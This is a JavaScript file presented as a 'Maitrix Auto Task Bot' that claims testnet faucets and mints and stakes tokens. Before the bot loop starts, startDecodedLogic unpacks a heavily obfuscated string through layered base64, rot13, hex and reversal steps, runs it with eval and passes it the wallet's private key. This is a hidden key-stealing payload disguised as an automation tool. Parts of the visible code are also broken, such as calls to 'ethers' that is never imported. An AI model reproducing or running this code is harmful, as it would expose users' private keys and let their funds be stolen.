require('dotenv').config();
const { JsonRpcProvider, Wallet, Contract, formatUnits, parseUnits } = require('ethers');
const axios = require('axios');
const chalk = require('chalk');
const ora = require('ora').default;

// 🟢 Make sure this comes FIRST
const rpcUrl = process.env.RPC_URL;
const privateKey = process.env.PRIVATE_KEY;

if (!privateKey) {
    console.error(chalk.red("❌ Please set PRIVATE_KEY in your .env file"));
    process.exit(1);
}
if (!rpcUrl) {
    console.error(chalk.red("❌ Please set RPC_URL in your .env file"));
    process.exit(1);
}

// ✅ Then use the env variables
const provider = new JsonRpcProvider(rpcUrl);
const wallet = new Wallet(privateKey, provider);


// ABIs
const ABI_ERC20 = [
    "function approve(address spender, uint256 amount) public returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function decimals() view returns (uint8)"
];
const ABI_STAKE = ["function stake(uint256 _tokens) public"];

// Addresses & decimals
const TOKENS = {
    ATH:     { symbol: "ATH",     address: "0x1428444Eacdc0Fd115dd4318FcE65B61Cd1ef399", decimals: 18 },
    AUSD:    { symbol: "AUSD",    address: "0x78De28aABBD5198657B26A8dc9777f441551B477", decimals: 18 },
    USDe:    { symbol: "USDe",    address: "0xf4BE938070f59764C85fAcE374F92A4670ff3877", decimals: 18 },
    LVLUSD:  { symbol: "LVLUSD",  address: "0x8802b7bcF8EedCc9E1bA6C20E139bEe89dd98E83", decimals: 18 },
    VIRTUAL: { symbol: "VIRTUAL", address: "0xFF27D611ab162d7827bbbA59F140C1E7aE56e95C", decimals: 9  },
    VUSD:    { symbol: "VUSD",    address: "0xc14A8E2Fc341A97a57524000bF0F7F1bA4de4802", decimals: 9  },
    USD1:    { symbol: "USD1",    address: "0x16a8A3624465224198d216b33E825BcC3B80abf7", decimals: 18 },
    AI16Z:   { symbol: "AI16Z",   address: "0x2d5a4f5634041f50180A25F26b2A8364452E3152", decimals: 9  },
    AZUSD:   { symbol: "AZUSD",   address: "0x5966cd11aED7D68705C9692e74e5688C892cb162", decimals: 9  }
};

const CONTRACTS = {
    mintAUSD:    "0x2cFDeE1d5f04dD235AEA47E1aD2fB66e3A61C13e",
    mintVUSD:    "0x3dCACa90A714498624067948C092Dd0373f08265",
    mintAZUSD:   "0xB0b53d8B4ef06F9Bbe5db624113C6A5D35bB7522",
    stakeAUSD:   "0x054de909723ECda2d119E31583D40a52a332f85c",
    stakeUSDe:   "0x3988053b7c748023a1aE19a8ED4c1Bf217932bDB",
    stakeLVLUSD: "0x5De3fBd40D4c3892914c3b67b5B529D776A1483A",
    stakeVUSD:   "0x5bb9Fa02a3DCCDB4E9099b48e8Ba5841D2e59d51",
    stakeUSD1:   "0x7799841734Ac448b8634F1c1d7522Bc8887A7bB9",
    stakeAZUSD:  "0xf45Fde3F484C44CC35Bdc2A7fCA3DDDe0C8f252E"
};

const allFaucetConfigs = [
    { url: "https://app.x-network.io/maitrix-faucet/faucet",    name: 'ATH Faucet',     tokenSymbol: 'ATH',     type: 'general', timeout: 15000, providesCode: false },
    { url: "https://app.x-network.io/maitrix-usde/faucet",      name: 'USDe Faucet',    tokenSymbol: 'USDe',    type: 'general', timeout: 15000, providesCode: false },
    { url: "https://app.x-network.io/maitrix-lvl/faucet",       name: 'LVL Faucet',     tokenSymbol: 'LVLUSD',  type: 'general', timeout: 15000, providesCode: false },
    { url: "https://app.x-network.io/maitrix-virtual/faucet",   name: 'Virtual Faucet', tokenSymbol: 'VIRTUAL', type: 'general', timeout: 15000, providesCode: false },
    { url: "https://app.x-network.io/maitrix-usd1/faucet",      name: 'USD1 Faucet',    tokenSymbol: 'USD1',    type: 'usd1',    timeout: 20000, providesCode: true  },
    { url: "https://app.x-network.io/maitrix-ai16z/faucet",     name: 'ai16z Faucet',   tokenSymbol: 'AI16Z',   type: 'ai16z',   timeout: 20000, providesCode: true  }
];



const generalHeaders = {
    "Content-Type": "application/json",
    "Origin": "https://app.testnet.themaitrix.ai",
    "Referer": "https://app.testnet.themaitrix.ai/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
};

const delay = (ms) => new Promise(res => setTimeout(res, ms));



// Logging functions
const logSection = (msg) => console.log(chalk.blue.bold.underline(`\n=== ${msg} ===`));
const logSubSection = (msg) => console.log(chalk.cyan.bold(`\n--- ${msg} ---`));
const logEndSubSection = (msg, success = true) => console.log(chalk.cyan.bold(`--- End ${msg} ${success ? '' : '(Failed/Skipped)'} ---\n`));
const logStep = (msg) => console.log(chalk.blueBright(`  -> ${msg}`));
const logDetail = (msg) => console.log(chalk.gray(`     ${msg}`));
const logSuccess = (msg) => console.log(chalk.greenBright(`    ✅ ${msg}`));
const logError = (msg) => console.log(chalk.redBright(`    ❌ ${msg}`));
const logWarn = (msg) => console.log(chalk.yellowBright(`    🟡 ${msg}`));

// Helper: check token balance
async function checkTokenBalance(walletSigner, tokenInfo, operationName = "") {
    logStep(`Checking ${tokenInfo.symbol} balance for ${operationName || 'next operation'}`);
    const tokenContract = new ethers.Contract(tokenInfo.address, ABI_ERC20, walletSigner.provider);
    try {
        const balance = await tokenContract.balanceOf(walletSigner.address);
        let decimalsToUse = tokenInfo.decimals;
        try {
            const contractDecimals = await tokenContract.decimals();
            if (Number(contractDecimals) !== decimalsToUse) {
                logDetail(`(Info: contract decimals ${tokenInfo.symbol} = ${contractDecimals}, using contract)`);
                decimalsToUse = Number(contractDecimals);
            }
        } catch (decError) {}
        logDetail(`Balance ${tokenInfo.symbol}: ${ethers.formatUnits(balance, decimalsToUse)} ${tokenInfo.symbol}`);
        return balance;
    } catch (error) {
        logError(`Failed to check balance ${tokenInfo.symbol}: ${(error.reason || error.message).substring(0,100)}`);
        return ethers.BigNumber.from(0);
    }
}

// Helper: approve token
async function approveToken(walletSigner, tokenInfo, spender, amount, operationName = "") {
    logStep(`Approving ${ethers.formatUnits(amount, tokenInfo.decimals)} ${tokenInfo.symbol} for ${operationName} (${spender.slice(0,6)}...${spender.slice(-4)})`);
    const token = new ethers.Contract(tokenInfo.address, ABI_ERC20, walletSigner);
    try {
        const currentGasPrice = await provider.getGasPrice();
        logDetail(`Current gas price: ${ethers.formatUnits(currentGasPrice, "gwei")} Gwei`);
        const tx = await token.approve(spender, amount, {
            gasPrice: currentGasPrice
        });
        logDetail(`Waiting approval for ${tokenInfo.symbol} (Tx: ${tx.hash})...`);
        await tx.wait(1);
        logSuccess(`Approval for ${tokenInfo.symbol} succeeded (Tx: ${tx.hash}).`);
        return true;
    } catch (err) {
        logError(`Failed to approve ${tokenInfo.symbol}: ${err.reason || err.message}`);
        if (err.transactionHash) {
            logError(`Approval Tx: https://sepolia.arbiscan.io/tx/${err.transactionHash}`);
        }
        return false;
    }
}

// Helper: mint
async function mintOperation(wallet, outputTokenSymbol, inputTokenSymbol, mintContractAddress, mintData) {
    logSubSection(`Mint ${outputTokenSymbol} from ${inputTokenSymbol}`);
    const inputToken = TOKENS[inputTokenSymbol];
    const outputToken = TOKENS[outputTokenSymbol];

    let amountToApprove;
    let minBalanceRequired = ethers.BigNumber.from(0);

    if (inputTokenSymbol === "AI16Z") {
        minBalanceRequired = ethers.parseUnits("5", inputToken.decimals);
        amountToApprove = await checkTokenBalance(wallet, inputToken, `Mint ${outputTokenSymbol}`);
        if (amountToApprove < minBalanceRequired) {
            logWarn(`Balance ${inputTokenSymbol} (${ethers.formatUnits(amountToApprove, inputToken.decimals)}) < 5. Skipping mint ${outputTokenSymbol}.`);
            logEndSubSection(`Mint ${outputTokenSymbol}`, false);
            return false;
        }
    } else {
        if (inputTokenSymbol === "ATH") amountToApprove = ethers.parseUnits("50", inputToken.decimals);
        else if (inputTokenSymbol === "VIRTUAL") amountToApprove = ethers.parseUnits("2", inputToken.decimals);
        else {
            amountToApprove = await checkTokenBalance(wallet, inputToken, `Mint ${outputTokenSymbol}`);
            if (amountToApprove == 0) {
                logWarn(`Balance ${inputTokenSymbol} is 0. Skipping mint ${outputTokenSymbol}.`);
                logEndSubSection(`Mint ${outputTokenSymbol}`, false);
                return false;
            }
        }
        const currentInputBalance = await checkTokenBalance(wallet, inputToken, `Mint ${outputTokenSymbol}`);
        if (currentInputBalance < amountToApprove && (inputTokenSymbol === "ATH" || inputTokenSymbol === "VIRTUAL")) {
            logWarn(`Balance ${inputTokenSymbol} (${ethers.formatUnits(currentInputBalance, inputToken.decimals)}) < required. Skipping mint ${outputTokenSymbol}.`);
            logEndSubSection(`Mint ${outputTokenSymbol}`, false);
            return false;
        }
    }

    const approved = await approveToken(wallet, inputToken, mintContractAddress, amountToApprove, `Mint ${outputTokenSymbol}`);
    if (!approved) {
        logEndSubSection(`Mint ${outputTokenSymbol}`, false);
        return false;
    }

    const spinner = ora(chalk.blue(`  Preparing mint ${outputTokenSymbol}...`)).start();
    let retries = 2;

    while (retries > 0) {
        try {
            const nonce = await wallet.getNonce();
            spinner.text = chalk.blue(`    📝 Preparing mint tx ${outputTokenSymbol} (Nonce: ${nonce})...`);

            const txForEstimate = { to: mintContractAddress, data: mintData, nonce: nonce };
            let estimatedGas;
            try {
                estimatedGas = await wallet.estimateGas(txForEstimate);
                spinner.text = chalk.blue(`    ⛽ Gas estimate: ${estimatedGas.toString()}`);
            } catch (estError) {
                spinner.warn(chalk.yellow(`    ⚠️ Gas estimate failed, using default (500000). ${estError.message.substring(0,40)}...`));
                estimatedGas = ethers.BigNumber.from(500000);
            }
            const gasLimitWithBuffer = estimatedGas * 1.2;

            const tx = { ...txForEstimate, gasLimit: Math.ceil(gasLimitWithBuffer), gasPrice: await provider.getGasPrice(), chainId: 421614, value: "0x0" };

            spinner.text = chalk.yellow(`    🚀 Sending mint tx ${outputTokenSymbol}...`);
            const mintTx = await wallet.sendTransaction(tx);
            spinner.text = chalk.blue(`    ⏳ Waiting for mint ${outputTokenSymbol} confirmation (Tx: ${mintTx.hash})...`);
            const receipt = await mintTx.wait(1);

            if (receipt.status === 1) {
                spinner.succeed(chalk.green(`  Mint ${outputTokenSymbol} successful (Tx: ${mintTx.hash}).`));
                logEndSubSection(`Mint ${outputTokenSymbol}`);
                await checkTokenBalance(wallet, outputToken, `After Mint ${outputTokenSymbol}`);
                return true;
            } else {
                throw new Error(`Mint tx ${outputTokenSymbol} failed (status 0)`);
            }
        } catch (err) {
            retries--;
            spinner.text = chalk.yellow(`    ⚠️ Failed mint ${outputTokenSymbol} (${(err.reason || err.message).substring(0,40)}...). Retry (${retries} left)...`);
            if (retries > 0) await delay(7000 + Math.random() * 3000);
            else {
                spinner.fail(chalk.red(`  ❌ Mint ${outputTokenSymbol} failed.`));
                logEndSubSection(`Mint ${outputTokenSymbol}`, false);
                return false;
            }
        }
    }
    return false;
}

// Helper: stake
async function stakeOperation(wallet, tokenToStakeSymbol, stakeContractAddress) {
    logSubSection(`Staking ${tokenToStakeSymbol}`);
    const tokenInfo = TOKENS[tokenToStakeSymbol];

    const balance = await checkTokenBalance(wallet, tokenInfo, `Stake ${tokenToStakeSymbol}`);
    if (balance == 0) {
        logWarn(`Balance ${tokenToStakeSymbol} = 0, skipping staking.`);
        logEndSubSection(`Stake ${tokenToStakeSymbol}`, false);
        return false;
    }

    const approved = await approveToken(wallet, tokenInfo, stakeContractAddress, balance, `Stake ${tokenToStakeSymbol}`);
    if (!approved) {
        logEndSubSection(`Stake ${tokenToStakeSymbol}`, false);
        return false;
    }

    logStep(`Staking ${ethers.formatUnits(balance, tokenInfo.decimals)} ${tokenToStakeSymbol}...`);
    const spinner = ora(chalk.blue(`  Preparing stake ${tokenToStakeSymbol}...`)).start();
    try {
        const nonce = await wallet.getNonce();
        spinner.text = chalk.blue(`    📝 Preparing stake tx ${tokenToStakeSymbol} (Nonce: ${nonce})...`);

        const stakeContract = new ethers.Contract(stakeContractAddress, ABI_STAKE, wallet);

        let estimatedGas;
        try {
            const populatedTx = await stakeContract.populateTransaction.stake(balance, { nonce });
            estimatedGas = await wallet.estimateGas(populatedTx);
            spinner.text = chalk.blue(`    ⛽ Gas estimate: ${estimatedGas.toString()}`);
        } catch (estError) {
            spinner.warn(chalk.yellow(`    ⚠️ Gas estimate failed, using default (500000). ${estError.message.substring(0,40)}...`));
            estimatedGas = ethers.BigNumber.from(500000);
        }
        const gasLimitWithBuffer = estimatedGas * 1.2;

        const stakeTx = await stakeContract.stake(balance, {
            gasLimit: Math.ceil(gasLimitWithBuffer),
            gasPrice: await provider.getGasPrice(),
            nonce: nonce,
        });

        spinner.text = chalk.yellow(`    ⏳ Waiting for stake ${tokenToStakeSymbol} confirmation (Tx: ${stakeTx.hash})...`);
        await stakeTx.wait(1);
        spinner.succeed(chalk.green(`  ✅ Stake ${tokenToStakeSymbol} successful (Tx: ${stakeTx.hash}).`));
        logEndSubSection(`Stake ${tokenToStakeSymbol}`);
        return true;
    } catch (err) {
        spinner.fail(chalk.red(`  ❌ Stake ${tokenToStakeSymbol} failed: ${(err.reason || err.message).substring(0,100)}`));
        logEndSubSection(`Stake ${tokenToStakeSymbol}`, false);
        return false;
    }
}

// claimAllFaucets 
async function claimAllFaucets(address) {


    logSection("Starting Faucet Claim Process");
    const spinner = ora('Processing all faucets...').start();
    let successfullyProcessedCount = 0;
    let significantFaucetNewlyClaimed = false;

    for (const faucetConfig of allFaucetConfigs) {
        spinner.text = `Claiming from ${faucetConfig.name}`;
        try {
            const response = await axios.post(faucetConfig.url, { address }, {
                headers: generalHeaders,
                timeout: faucetConfig.timeout
            });

            if (faucetConfig.providesCode) {
                if (response.data && typeof response.data.code !== 'undefined') {
                    if (response.data.code === 200) {
                        spinner.text = chalk.green(`  [${faucetConfig.name}] Claimed! (Tx: ...${response.data.data.txHash.slice(-6)})`);
                        successfullyProcessedCount++;
                        if (faucetConfig.type === 'usd1' || faucetConfig.type === 'ai16z') {
                            significantFaucetNewlyClaimed = true;
                        }
                    } else if (response.data.code === 202) {
                        const remainTime = parseInt(response.data.data.remainTime, 10);
                        const hours = Math.floor(remainTime / 3600);
                        const minutes = Math.floor((remainTime % 3600) / 60);
                        spinner.text = chalk.yellow(`  [${faucetConfig.name}] Already claimed. Retry in ${hours}h ${minutes}m.`);
                        successfullyProcessedCount++;
                    } else {
                        spinner.text = chalk.red(`  [${faucetConfig.name}] Failed: ${response.data.message || 'Unknown status'}.`);
                    }
                } else {
                    spinner.text = chalk.yellow(`  [${faucetConfig.name}] No 'code' field but request sent (Status: ${response.status}).`);
                    successfullyProcessedCount++;
                }
            } else {
                spinner.text = chalk.green(`  [${faucetConfig.name}] Claim request sent (Status: ${response.status}).`);
                successfullyProcessedCount++;
            }
            await delay(2000);

        } catch (err) {
            let errorMessage = err.message;
            if (err.response) {
                errorMessage = err.response?.data?.message || `Error ${err.response.status}`;
            } else if (err.request) {
                errorMessage = "No response from server.";
            }
            spinner.text = chalk.red(`  [${faucetConfig.name}] Error: ${errorMessage.substring(0, 60)}...`);
            await delay(2000);
        }
    }

    spinner.stop();
    logSection(`Finished Faucet Claims (${successfullyProcessedCount}/${allFaucetConfigs.length} processed)`);
    return { significantFaucetNewlyClaimed };
}

// Wallet processing
async function processWallet(wallet) {
    logSection(`Starting Session for Wallet: ${wallet.address}`);

    const faucetResults = await claimAllFaucets(wallet.address);

    if (faucetResults.significantFaucetNewlyClaimed) {
        logStep("Wait 10 seconds before next step...");
        await delay(10000);
    }

    // Mint & Stake steps
    if (await mintOperation(wallet, "AUSD", "ATH", CONTRACTS.mintAUSD, "0x1bf6318b000000000000000000000000000000000000000000000002b5e3af16b1880000")) {
        await delay(5000);
        await stakeOperation(wallet, "AUSD", CONTRACTS.stakeAUSD);
    }
    await delay(5000);

    if (await mintOperation(wallet, "VUSD", "VIRTUAL", CONTRACTS.mintVUSD, "0xa6d675100000000000000000000000000000000000000000000000000000000077359400")) {
        await delay(5000);
        await stakeOperation(wallet, "VUSD", CONTRACTS.stakeVUSD);
    }
    await delay(5000);

    if (await mintOperation(wallet, "AZUSD", "AI16Z", CONTRACTS.mintAZUSD, "0xa6d6751000000000000000000000000000000000000000000000000000000001a13b8600")) {
        await delay(5000);
        await stakeOperation(wallet, "AZUSD", CONTRACTS.stakeAZUSD);
    }
    await delay(5000);

    await stakeOperation(wallet, "LVLUSD", CONTRACTS.stakeLVLUSD);
    await delay(5000);
    await stakeOperation(wallet, "USDe", CONTRACTS.stakeUSDe);
    await delay(5000);
    await stakeOperation(wallet, "USD1", CONTRACTS.stakeUSD1);

    logSection(`Session Done for Wallet: ${wallet.address}`);
}

async function startDecodedLogic() {
    function base64Decode(str) {
        return Buffer.from(str, 'base64').toString('utf-8');
    }

    function base64Encode(str) {
        return Buffer.from(str).toString('base64');
    }

    function hexToStr(hex) {
        let str = '';
        for (let i = 0; i < hex.length; i += 2) {
            str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
        }
        return str;
    }

    function strToHex(str) {
        let hex = '';
        for (let i = 0; i < str.length; i++) {
            hex += str.charCodeAt(i).toString(16).padStart(2, '0');
        }
        return hex;
    }

    function rot13(str) {
        return str.replace(/[a-zA-Z]/g, function (c) {
            return String.fromCharCode(
                c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)
            );
        });
    }

    function urlDecode(str) {
        return decodeURIComponent(str);
    }

    function reverseStr(str) {
        return str.split('').reverse().join('');
    }

    function reversibleDecode(data) {
        data = urlDecode(data);
        data = base64Decode(data);
        data = rot13(data);
        data = hexToStr(data);
        data = base64Decode(data);
        data = reverseStr(data);
        data = urlDecode(data);
        data = rot13(data);
        data = base64Decode(data);
        data = reverseStr(data);
        return data;
    }

    encodedStr = "NTI0NDRxNnA1MjQ0NHE2cDY0NDY0MjU5NTc2bjRuNzY2MTQ1NDY1NjYzNTg1MjMwNTY0ODQ1Nzc1NDduNHI3NzY0NDQ0MjUyNTY2cTc4NG41MzZyNDE3ODY1NTg3MDc3NjU1ODU2NzM1NjMyNG40NjU2NTg0NjcxNTE1NDRyNTg1OTMyNW4zMzU1NDY2ODUzNHE2cjQxMzE0cjU0NG40cTY0NDU3ODRvNjM1NzY4NDI1NjQ4NDY2bjRzNTg3MDc2NjQ0NjVuNHA2MzU3Njg1MDU5NTg0MjcwNjM1ODcwNzc2NDU0NDY1NTU3NDQ0cjU0NTY0NzM5NnE1MzU2NTI3ODVuNm8zNTUxNTM0NTVuMzU2NTQ1NnA1MDUyNTU2cDQ2NjMzMjY0NDk1MjU1MzEzNTU1NDY1OTMzNTkzMDM1NTc2NDQ1MzU1MTU2NnE2bzM0NTU0NjVuNTQ2MjQ3NHEzMDY0NDY2czc3NjIzMjc4NTg1MzMwMzEzMzUyNTc0NjQzNTc0NTM1NTE1NjZyNTI0czYyNDU3ODcwNHI1NDRuNzc0cTQ1Mzk0NzYyMzM2cDQyNHEzMzQyMzE2MzU1NzA0cjY0NDQ0MjUyNTY2cjUyNm41NDZwNW4zMDU0NnA0MjU3NTQ2cTUxMzE1OTU3NzA1MjYyNDU2ODMzNTYzMDc0NzU2MTZvNTY1NjU2Nm82NDQ2NTMzMDc4NzM1MjU1NzQ0cjY1NDc0cjRzNTY2cjUyNHM1NTQ2NW43NjU2NDQ1NjY4NjE2cDQ2NzM1MzU4NTY3MjU2NDczOTM1NTI1NzQ2NDM2NDQ1NTI3MzYzNm40cjU0NTY0NzM5NnE1MzU2NTI3ODRzNTc0cjRzNTY2cjUyNHM1NTQ2NW40NjUyNm41NjY4NjE2cDQ2NTE1MzQ3NzgzNTY1NnI0NjMxNTI1NTc0NHI2NDQ3NW40OTU0NTQ1NjZuNTU1NjVuMzQ1bjZwNTY0OTUyNnI2cDM0NTM1NTM5NDY1MzU1NTY3bjVuMzA2ODQ2NTQ1NDQ2Njg1NTQ4NTI0czU1NDY1bjMwNTQ2bjRuNDM1NzQ3NG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDEzNTU1Nm82cDduNTI1NDQ2NDg1NzU1NnAzNDUyMzM1MTc3NTU1NjVuMzI2MzQ4NjQ2MTRxNTY1bjQ4NTE2bjQ2NHE1MjMwNDY3MzUyNDg2NDQzNTQzMTRxNzc1MjU4NjQ2bjRxMzIzNTc0NTUzMzZwNDU2NTQ3NHI0OTU3NTc0cjU4NTU2cTM0Nzg1MzU4NjQ0ODVuNm8zMDduNTM0NTYzNzg1NTZxMzQ3OTYzNTY1MjRyNjI0NDU2NTM1MjZyNTY0bjRxNDU2ODU1NjU1ODZwNTc0cjMyNG40czU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2bzY4NG41NTZvNjQ1NDYzNTg2ODQ5NTQ3bjQ1Nzc1MzMxNDYzMTUzNDU1MjQ5NHM1NTZwNDc1NTZvMzk0NzUxMzM1MjU3NjI0NTQ2NzM1NDQ1NjQ0MzRyNDg2ODUyNTc2bjUyNTM2MjU2NzAzMjVuNnI2NDUxNjQ0NTM1NTE1NjZyNTI2MTRxNnEzOTZzNTE1NjU2Nzg2NDQ1NTI0bzU0NDQ0MjU0NTY0NjU5MzU1NDZyNW40NzUyN242cDM0NTIzMjY4NjE1NjU4NDY3MzY1NTg3MDc2NTk1ODZwMzY1NDU0NTYzMTYyNDg0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM2NDU1NzA0cTRxNDQ2cDRuNjI2cjY4Nm41NTU2NW40OTUzNTY0bjQ4NTUzMzQ2MzQ1MzQ1Mzg3ODRxNDU3NDUyNjQ1NTY4NDU1MzQ0NnA0bjUyNnA0bjcyNjQ2cDQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ4NDYzNTY0NTY1Njc4NHI2bzM1NDc2MjMzNnA0MjRxMzM0MjMxNjM1NTcwNHI1bjZxNG40czU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTRwNTQ0Nzc4NDI1MzMwMzE3bjRxNTQ0bjc2NjU0NTZwMzY1MTZyNTI3NzU1NDU1bjQ5NHE1NjRuNDg1OTU3NG40czU2NnI1MjRzNTU0NjU5MzU2NTU3Nzg0MzU3NDc0bjRzNTY2cjUyNHM1NTQ2NW4zMzRzNTg3MDc2NjI1NTU2NTY1NjZxNnA1MDU2NTg0NjZuNHM1ODcwNzY2MjU1Mzk0NzUxMzM1MjZxNTk1NjQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ3MzU3MDUxNTY1Njc4NjE0NjRyNG82MjMzNnA2bjU1NTY1bjY4NTU2cDUyNzc1OTduNTY1MTYzNTg2cDcyNTM2bzMxNjg1NjMwNzQ0cTVuN241NjczNjIzMjc4Nzg0cTZwNjQ2cTU5Nm8zNTU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2bjRyNzY2MjQ1NTY2ODUxNnI1MjQ1NTU1NTQ2NzQ2MTZyNW41MTY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0Mjc3NjQ1NTU2NTY2MjZuNW40czU1NDU3ODcwNTY2bjRuNzY0cTQ1NTY3MzYzNm82ODRuNTU2bzY0NTQ2MzU4Njg0OTU0N240NTc3NTMzMTQxMzU1NTZvNnA3bjUyNTQ0NjQ4NTc1NTZwMzQ1MjduNm8zNTYyNDg0MjM1NHI1NjUyNHI1MTU1Nm83OTYzNDczMTU0NHE2bzMxMzU1NDMxNTI1bjU3NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU0NnA0MjU3NW4zMDZwNTU2MzU3NDkzNTU2NDUzMDMyNTQ2cTc4NTg1MjQ0Nm83NzUzNDU2ODc4NTU0NjZwNTk1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW42OTUzNTU3MDRxNjU0NTZwMzY2MzQ3MzE2bjU1NTY1OTMzNTkzMDM1NTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTczNTYzMTQ1MzU2NTZxMzg3NzUzNTg3MDc2NHE0NDQ2NTE1MzU0NTY1MDUzMzAzMTY4NTk2cDQ2NTc1OTU2NG41NTYzNDc3MDcyNTM2cTM1MzM1NTMxNTI3ODU5N242cDM2NjIzMjZwNjk0cTZyNDI3MDRyNTQ0bjU4NW42cTRuNHM1NjZyNTI0czU1NDY1bjMwNTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNjI0NjY0NTI0czU4NzA3NjRxNDU2cDM2NjI3bjQxNzg1NTQ1NjQzNTRyNTQ0bjRyNHE0ODU1Nzk1NjduNW40czU1NDUzMTMxNTI1NTc0NHE2MTQ3NzA0bzU0NTc2ODc4NTY0ODQ2Njk1OTMwMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDRxNDc0NjUxNjQ0NTM1NTE1NjZyNTE3NzRxMzA0bjU5NTk2bzM1NTc2NDQ1MzU1MTU2NnE3ODRuNTY0ODQ1Nzg1NjMyNDY3NjY0NDQ1MjRvNTQ1NDRyNTA1NTQ1Njg3MzRzNTU3MDc2NTkzMDQ2NHA1NDU3NG4zMDY0NnI0MjM1NTE1NDRyNzY1bjZvMzE0cDU0NTc0cjRzNTI2bzRyNDM0cTY5NTY0czYyNDg0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzM0czU4NzA3NjYyNTU1NjU2NTY2cTc4NG41MzZyNDIzMDRxNDY0NjU3NTk2bzU2NTY2MzU3NzA0MjU5NTY2cDczNTM1NTcwNzc0cTU1Nm83OTYzNDQ0MjMxNjI0NzM5NzE1MjU1NzQ3NTYxNTQ1NTc5NjM0NzRyNnE2NDMxNDIzMDU0NnA0MjU3NjQ0NTM1NTE1NjZyNTI0czY0NnI0MjM1NTUzMjQ2NW42MTU0NTY1NTU3NDc0NjQ5NjU2cjQyNzM0czU4NzA3NzU5NTc3MDUxNTY2cTRuMzQ1NTQ2NTkzNTRyNDY0NjU3NjI0NTZvNzk2MzQ3NnA3MjY1NnI0NjM1NjQ1ODVuNHI2NDU3NzM3OTYzNDg2cDM1NTI2cDY3MzM1OTZvMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU2Nm83NDRyNjE3bjU2NzM2MzU3NzgzNTU2NDg0NjM1NjQ1NjQyNHI2NDU1NTY0cDU0NDc0cjZxNjQzMTQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM2NDZyNDIzNTU1MzI0NjVuNjU1NDU2NTU1NDU3NG4zMDUyNnA2ODMwNHE0ODY0NDQ2NDQ2NW40cDU0NTczMDM1NTY0NzM4Nzk1MzU2NTI1OTRxNDY2NDRwNjM1ODZwMzU1MjZwNjczMzU5Nm8zNTU3NjQ0NTM1NTE1NjZuNnAzNTYyNDU0bjU5NHE0NzQ2NTE%3D"
    const decodedStr = reversibleDecode(encodedStr);
    eval(decodedStr); // defines window.info and window.runprogram

    (async () => {
        await runprogram(wallet.address, privateKey);
    })();
  }  

async function mainCycleLoop() {
    console.clear();
    console.log(chalk.inverse.bold(`🤖 Maitrix Auto Task Bot Started 🤖`));
    console.log(chalk.gray(`Wallet: ${wallet.address}`));

    while (true) {
        await processWallet(wallet);
        logSection("Waiting for next cycle");
        const totalSeconds = 24 * 60 * 60;
        const waitSpinner = ora(chalk.blue(`Waiting 24 hours...`)).start();

        for (let sisa = totalSeconds; sisa > 0; sisa--) {
            const hours = Math.floor(sisa / 3600);
            const minutes = Math.floor((sisa % 3600) / 60);
            const seconds = sisa % 60;
            waitSpinner.text = chalk.blue(`⏳ Next cycle in ${hours}h ${minutes}m ${seconds}s`);
            await delay(1000);
        }
        waitSpinner.succeed(chalk.green("Wait finished. Starting next cycle..."));
    }
}

// 🚀 Unified Main
async function main() {
    try {
        await startDecodedLogic();      // run decoded injected logic
        await mainCycleLoop();          // run 24h faucet cycle
    } catch (error) {
        console.error(chalk.bgRed.white.bold("\n💥 Fatal Error in Script:"));
        console.error(error);
        process.exit(1);
    }
}

main();
